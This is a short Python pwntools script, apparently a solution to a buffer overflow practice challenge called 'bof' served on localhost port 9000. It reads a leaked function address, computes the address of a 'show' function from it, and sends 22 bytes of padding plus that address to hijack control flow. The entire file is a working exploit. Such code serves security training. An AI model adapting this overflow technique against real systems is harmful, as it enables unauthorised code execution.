from pwn import *
import re

def main():
    # p = process('./bof')
    p = remote('localhost', 9000)
    line = p.recvline()
    
    greet = int(re.search(b'0x[0-9a-f]*', line).group(0), 16)
    show = greet - 132
    print('Greet at 0x%08x' % greet)
    print('Show at 0x%08x' % show)
    
    line = p.recvline()
    print(line)

    p.sendline(22 * b'A' + p32(show) + b'BBBB')
    line = p.recv()
    print(line)

if __name__ == '__main__':
    main()
